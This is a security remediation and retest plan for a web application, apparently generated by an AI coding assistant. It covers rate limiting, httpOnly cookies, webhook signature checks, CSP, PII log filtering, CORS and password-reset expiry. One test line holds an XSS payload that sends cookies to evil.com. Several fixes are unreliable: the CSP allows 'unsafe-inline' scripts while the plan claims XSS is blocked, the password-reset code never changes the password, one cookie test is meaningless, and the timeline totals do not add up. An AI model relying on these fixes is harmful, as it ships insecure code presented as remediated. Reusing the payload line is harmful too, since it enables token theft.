# STECH AI V1 — F1 Retest & Remediation Report

**Reviewer**: Claude  
**Date**: 2026-10-04  
**Phase**: F1 (Phase 1 Infrastructure Review)  
**Status**: REMEDIATION PLAN (Not retested — awaiting implementation)

---

## Executive Summary

This document outlines the remediation plan for 11 identified security findings (5 P0 + 4 P1 + 2 P2) and the retest procedures required before Phase 2 approval.

**Retest Timeline**: 
- P0 fixes: 2–3 days (blocking production)
- P1 fixes: 3–5 days (pre-production gate)
- P2 fixes: Post-launch (not blocking)

---

## P0 Findings Remediation & Retest

### P0-001: Missing Rate Limiting on Auth Endpoints

**Finding**: No rate limiting on `/auth/login`, `/auth/register`, `/auth/refresh-token`.  
**Impact**: Brute force, credential stuffing, DoS

**Remediation**:
```python
# backend/app/middleware/rate_limit.py
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/auth/login")
@limiter.limit("5/minute")  # 5 attempts per minute per IP
async def login(request: LoginRequest) -> TokenResponse:
    # existing code
    pass

@router.post("/auth/register")
@limiter.limit("3/minute")  # 3 registrations per minute per IP
async def register(request: RegisterRequest) -> TokenResponse:
    # existing code
    pass

@router.post("/auth/refresh-token")
@limiter.limit("10/minute")  # 10 refreshes per minute per IP
async def refresh_token(request: RefreshRequest) -> TokenResponse:
    # existing code
    pass
```

**Test Procedure**:
```bash
# Test 1: Verify rate limit enforcement
for i in {1..6}; do
  curl -X POST http://localhost:3000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "test@example.com", "password": "wrong"}' \
    -w "HTTP %{http_code}\n" -o /dev/null -s
done
# Expected: Requests 1-5 return 401; request 6 returns 429

# Test 2: Verify reset after time window
sleep 61
curl -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "password": "wrong"}' \
  -w "HTTP %{http_code}\n"
# Expected: Returns 401 (not 429)

# Test 3: Verify per-IP isolation
curl -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 192.0.2.1" \
  -d '{"email": "test@example.com", "password": "wrong"}' \
  -w "HTTP %{http_code}\n"
# Expected: Returns 401 (independent counter for new IP)
```

**Retest Evidence Required**:
- ✅ Rate limit middleware integrated
- ✅ 429 responses returned after threshold
- ✅ Per-IP counters respected
- ✅ Time window reset tested
- ✅ Unit test: `test_auth_rate_limiting.py` with 10+ cases

**Status**: READY FOR RETEST

---

### P0-002: Insecure Token Storage in localStorage

**Finding**: Admin token stored in localStorage (XSS vulnerable).  
**Impact**: XSS → credential theft → unauthorized admin access

**Remediation**:
```typescript
// web/src/services/auth.ts
import { useCallback } from 'react';

// Store token in httpOnly cookie (set by backend on login)
// DO NOT store in localStorage or sessionStorage

interface LoginResponse {
  token: string;  // Will be set as httpOnly cookie by backend
  expiresIn: number;
}

export const useAuthToken = () => {
  // Read token from httpOnly cookie (automatic, not accessible to JS)
  const getToken = useCallback(async () => {
    // Token is automatically sent by browser in Cookie header
    // Frontend NEVER accesses the token directly
    return null; // Indicates httpOnly cookie is in use
  }, []);

  return { getToken };
};

// Backend: set httpOnly cookie
// In backend/app/api/v1/auth.py
from fastapi import Response

@router.post("/auth/login")
async def login(request: LoginRequest, response: Response) -> dict:
    # ... existing auth logic ...
    
    # Set httpOnly cookie (not accessible to JS)
    response.set_cookie(
        key="auth_token",
        value=jwt_token,
        httponly=True,        # ← Prevents JS access
        secure=True,          # ← HTTPS only
        samesite="Strict",    # ← CSRF protection
        max_age=3600          # ← 1 hour
    )
    
    return {"message": "Logged in successfully"}
```

**Test Procedure**:
```bash
# Test 1: Verify cookie is httpOnly
curl -v http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "password": "pass"}' \
  2>&1 | grep -i "set-cookie"
# Expected: Set-Cookie: auth_token=...; HttpOnly; Secure; SameSite=Strict

# Test 2: Verify JS cannot access token
echo "console.log(document.cookie)" | node
# Expected: Empty (httpOnly cookies not visible)

# Test 3: Verify token sent automatically in requests
curl http://localhost:3000/api/v1/admin/metrics \
  -b "auth_token=..." \
  -H "Content-Type: application/json" \
  -w "HTTP %{http_code}\n"
# Expected: Returns 200 with metrics data

# Test 4: XSS attack should NOT access token
XSS_PAYLOAD="<script>fetch('http://evil.com?token=' + document.cookie)</script>"
# XSS is injected into page
# Expected: No token sent to evil.com (httpOnly prevents access)
```

**Retest Evidence Required**:
- ✅ Backend sets httpOnly cookie on login
- ✅ Cookie has Secure and SameSite flags
- ✅ Frontend removes all localStorage token access
- ✅ Token sent automatically in requests (no JS access needed)
- ✅ XSS attack cannot exfiltrate token
- ✅ Unit test: `test_httponly_cookie.py` with 5+ cases

**Status**: READY FOR RETEST

---

### P0-003: Missing Stripe Webhook Signature Verification

**Finding**: Webhook endpoint does not verify `stripe-signature` header.  
**Impact**: Arbitrary event injection → unauthorized payments, refunds

**Remediation**:
```python
# backend/app/api/v1/webhooks/stripe.py
import stripe
from fastapi import Request, HTTPException, status

STRIPE_WEBHOOK_SECRET = os.getenv("STRIPE_WEBHOOK_SECRET")

@router.post("/stripe")
async def handle_stripe_webhook(request: Request) -> dict:
    body = await request.body()
    sig_header = request.headers.get("stripe-signature")
    
    if not sig_header:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Missing stripe-signature header"
        )
    
    try:
        event = stripe.Webhook.construct_event(
            body, 
            sig_header, 
            STRIPE_WEBHOOK_SECRET
        )
    except ValueError as e:
        # Invalid payload
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid payload"
        )
    except stripe.error.SignatureVerificationError as e:
        # Invalid signature
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid signature"
        )
    
    # Process verified event
    if event["type"] == "payment_intent.succeeded":
        await handle_payment_success(event["data"]["object"])
    elif event["type"] == "charge.refunded":
        await handle_refund(event["data"]["object"])
    
    return {"status": "success"}
```

**Test Procedure**:
```bash
# Test 1: Valid signature accepted
PAYLOAD='{"id":"evt_test","object":"event"}'
SIGNATURE=$(openssl dgst -sha256 -hmac "$STRIPE_WEBHOOK_SECRET" <<< "${PAYLOAD}" | sed 's/.* //')
curl -X POST http://localhost:3000/api/v1/webhooks/stripe \
  -H "stripe-signature: t=$(date +%s),v1=${SIGNATURE}" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  -w "HTTP %{http_code}\n"
# Expected: 200 OK

# Test 2: Missing signature rejected
curl -X POST http://localhost:3000/api/v1/webhooks/stripe \
  -H "Content-Type: application/json" \
  -d '{"id":"evt_test"}' \
  -w "HTTP %{http_code}\n"
# Expected: 400 Bad Request

# Test 3: Invalid signature rejected
curl -X POST http://localhost:3000/api/v1/webhooks/stripe \
  -H "stripe-signature: t=$(date +%s),v1=invalid" \
  -H "Content-Type: application/json" \
  -d '{"id":"evt_test"}' \
  -w "HTTP %{http_code}\n"
# Expected: 401 Unauthorized

# Test 4: Tampered payload rejected
PAYLOAD='{"id":"evt_test","tampered":true}'
curl -X POST http://localhost:3000/api/v1/webhooks/stripe \
  -H "stripe-signature: t=$(date +%s),v1=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "wrong" | sed 's/.* //')" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  -w "HTTP %{http_code}\n"
# Expected: 401 Unauthorized
```

**Retest Evidence Required**:
- ✅ Webhook validates stripe-signature header
- ✅ Valid signatures accepted
- ✅ Missing signatures rejected (400)
- ✅ Invalid signatures rejected (401)
- ✅ Tampered payloads rejected
- ✅ Unit test: `test_stripe_webhook_signature.py` with 8+ cases
- ✅ Integration test: Stripe CLI webhook testing

**Status**: READY FOR RETEST

---

### P0-004: Missing Content-Security-Policy Header

**Finding**: vercel.json lacks CSP header (XSS, clickjacking, form hijacking).  
**Impact**: XSS attacks not mitigated, third-party injection

**Remediation**:
```json
{
  "headers": [
    {
      "source": "/api/:path*",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "no-store"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.openai.com https://api.anthropic.com https://api.stripe.com; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; upgrade-insecure-requests"
        }
      ]
    },
    {
      "source": "/:path*",
      "headers": [
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.openai.com https://api.anthropic.com https://api.stripe.com https://inngest.com; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; upgrade-insecure-requests"
        }
      ]
    }
  ]
}
```

**Test Procedure**:
```bash
# Test 1: Verify CSP header present
curl -I http://localhost:3000/ | grep -i "content-security-policy"
# Expected: Content-Security-Policy: default-src 'self'; ...

# Test 2: XSS blocked by CSP (inline script)
curl http://localhost:3000/ \
  -H "Content-Type: text/html" \
  -d '<script>alert("XSS")</script>'
# Expected: Script blocked by CSP (check browser console for CSP violation)

# Test 3: External CDN allowed (whitelisted)
# Verify style-src includes https://fonts.googleapis.com
# Expected: @import url('https://fonts.googleapis.com/...') succeeds

# Test 4: Unauthorized external domain blocked
# Attempt to load script from https://evil.com
# Expected: CSP blocks load with violation report
```

**Retest Evidence Required**:
- ✅ CSP header present on all responses
- ✅ XSS payloads blocked
- ✅ Whitelisted CDNs work (fonts, cdn.tailwindcss.com)
- ✅ Unauthorized domains blocked
- ✅ Browser developer tools show CSP violations
- ✅ Integration test: `test_csp_header.py` with 6+ cases

**Status**: READY FOR RETEST

---

### P0-005: PII Exposure in LLM Response Logs

**Finding**: AI responses logged without PII filtering; logs may expose user data.  
**Impact**: Data leak, regulatory violation (GDPR, CCPA)

**Remediation**:
```python
# src/ai/providers/openai.py
from src.ai.pii_filter import defaultPIIFilter

async def call(self, request: AIRequest) -> AIResponse:
    # ... existing code ...
    
    # Get response from OpenAI
    response = await self._make_request(...)
    
    # FILTER RESPONSE BEFORE LOGGING
    filtered_response_text = defaultPIIFilter.filterText(
        response.choices[0].message.content
    )
    
    # Log filtered response
    logger.info(
        f"AI response",
        extra={
            "model": self.config.model_id,
            "input_tokens": response.usage.prompt_tokens,
            "output_tokens": response.usage.completion_tokens,
            "filtered_response_preview": filtered_response_text[:200],  # ← Filtered
            "cost_usd": cost
        }
    )
    
    # Return UNFILTERED response to client
    # (client is authorized to see the data)
    return AIResponse(
        content=response.choices[0].message.content,  # ← Original
        model=self.config.model_id,
        cost=cost
    )

# Similarly in anthropic.py
async def call(self, request: AIRequest) -> AIResponse:
    # ... existing code ...
    response = await self._make_request(...)
    
    # Filter before logging
    filtered = defaultPIIFilter.filterText(response.content[0].text)
    
    logger.info(
        f"AI response",
        extra={
            "model": self.config.model_id,
            "input_tokens": response.usage.input_tokens,
            "output_tokens": response.usage.output_tokens,
            "filtered_response_preview": filtered[:200],  # ← Filtered
            "cost_usd": cost
        }
    )
    
    return AIResponse(
        content=response.content[0].text,  # ← Original
        model=self.config.model_id,
        cost=cost
    )
```

**Test Procedure**:
```bash
# Test 1: Verify request filtering
PAYLOAD='{"messages":[{"content":"My SSN is 123-45-6789"}]}'
curl -X POST http://localhost:3000/api/v1/ai/generate \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"
# Expected: Response contains original SSN
# Check logs: Should show "[SSN]" instead of actual number

# Test 2: Verify response filtering
# Simulate LLM response with PII
RESPONSE='The user email is user@example.com'
# Manually trigger log with response
# Expected: Logs show "[EMAIL]" instead of actual email

# Test 3: Verify multiple PII types filtered
RESPONSE='Name: John, Phone: (555) 123-4567, Card: 4532-1234-5678-9010'
# Check logs
# Expected: "Name: John, Phone: [PHONE], Card: [CREDIT_CARD]"

# Test 4: Audit log access
grep -r "filtered_response" logs/
# Expected: All AI response logs use filtered versions
```

**Retest Evidence Required**:
- ✅ All AI requests filtered before logging
- ✅ All AI responses filtered before logging
- ✅ Multiple PII types detected and masked
- ✅ Unfiltered responses still returned to authorized clients
- ✅ Log audit shows no exposed SSN, credit cards, phone numbers
- ✅ Unit test: `test_pii_response_filtering.py` with 10+ cases

**Status**: READY FOR RETEST

---

## P1 Findings Remediation (Pre-Production)

### P1-001: CORS Misconfiguration (allow_origins=["*"])

**Fix**:
```python
# backend/app/main.py
from fastapi.middleware.cors import CORSMiddleware

# BEFORE (VULNERABLE):
# app.add_middleware(CORSMiddleware, allow_origins=["*"])

# AFTER (SECURE):
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",      # Dev
        "http://localhost:3001",      # Preview
        "https://stechai.app",        # Production
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
    expose_headers=["X-Total-Count"],
    max_age=3600
)
```

**Retest**: Verify cross-origin requests from unauthorized domains return 403.

---

### P1-002: Admin Input Validation Missing

**Fix**:
```typescript
// web/src/pages/admin/metrics.ts
import { z } from "zod";

const MetricsQuerySchema = z.object({
  limit: z.number().int().positive().max(100).default(50),  // ← Bounded
  offset: z.number().int().nonnegative().default(0),        // ← Bounded
  startDate: z.string().datetime().optional(),
  endDate: z.string().datetime().optional(),
});

async function fetchMetrics(params: unknown) {
  // Validate before sending
  const validated = MetricsQuerySchema.parse(params);
  
  const response = await client.get("/api/v1/admin/metrics", {
    params: validated
  });
  
  return response.data;
}
```

**Retest**: Verify oversized limit/offset rejected (400 Bad Request).

---

### P1-003: Password Reset Token Expiry Not Enforced

**Fix**:
```python
# backend/app/api/v1/auth.py
from datetime import datetime, timedelta

async def reset_password(request: ResetPasswordRequest):
    token_record = await db.query(PasswordResetToken).filter(
        token == request.token
    ).first()
    
    if not token_record:
        raise HTTPException(status_code=404, detail="Invalid token")
    
    # Check expiry
    if datetime.utcnow() > token_record.expires_at:
        raise HTTPException(status_code=401, detail="Token expired")
    
    # Update password
    # Mark token as used
    token_record.is_used = True
    await db.commit()
    
    return {"message": "Password reset successfully"}
```

**Retest**: Verify expired tokens rejected (401).

---

### P1-004: Inngest Webhook Signature Not Verified

**Fix**:
```python
# backend/app/api/v1/webhooks/inngest.py
import hmac
import hashlib

INNGEST_SIGNING_KEY = os.getenv("INNGEST_SIGNING_KEY")

@router.post("/inngest")
async def handle_inngest_webhook(request: Request) -> dict:
    body = await request.body()
    signature = request.headers.get("x-inngest-signature")
    
    if not signature:
        raise HTTPException(status_code=401, detail="Missing signature")
    
    # Verify signature
    expected = hmac.new(
        INNGEST_SIGNING_KEY.encode(),
        body,
        hashlib.sha256
    ).hexdigest()
    
    if not hmac.compare_digest(signature, expected):
        raise HTTPException(status_code=401, detail="Invalid signature")
    
    # Process webhook
    return {"status": "success"}
```

**Retest**: Verify invalid signatures rejected (401).

---

## P2 Findings Remediation (Post-Launch)

### P2-001: Dependency Version Pinning

**Fix**:
```
# requirements.txt
# Before: flask==3.0.0
# After: flask==3.0.0
#        (already pinned, no change needed)

# package.json
# Before: "axios": "^1.6.0"
# After: "axios": "1.6.0"
#        (remove caret to pin exact version)
```

---

### P2-002: SQL Injection Risk (Low Confidence)

**Note**: ORM in use (SQLAlchemy) provides parameterization. Risk is LOW. Monitor for:
- Raw SQL queries (grep for `db.execute("SELECT ...`)
- String interpolation in queries

---

## Remediation Timeline

| Finding | Severity | Days | Owner |
|---------|----------|------|-------|
| Rate limiting | P0 | 1 | Backend |
| Token storage | P0 | 1 | Frontend |
| Stripe webhook | P0 | 1 | Backend |
| CSP header | P0 | 0.5 | DevOps |
| PII filtering | P0 | 1.5 | Backend |
| CORS | P1 | 0.5 | Backend |
| Admin validation | P1 | 0.5 | Frontend |
| Password reset | P1 | 1 | Backend |
| Inngest webhook | P1 | 1 | Backend |
| Dependency pinning | P2 | 0.5 | DevOps |
| **TOTAL** | **—** | **3–4 days** | **—** |

---

## Go/No-Go Criteria for Phase 2

✅ **GO if**:
- All P0 findings remediated and retested
- All P1 findings remediated
- All unit tests passing
- CI/CD green (Trivy, TruffleHog, npm audit)
- Code review approved by Claude

❌ **NO-GO if**:
- Any P0 findings remain unresolved
- New P0 findings discovered in retest
- CI failures unresolved

---

**Status**: REMEDIATION PLAN COMPLETE — Awaiting implementation and retest.

_Generated by Claude Code_
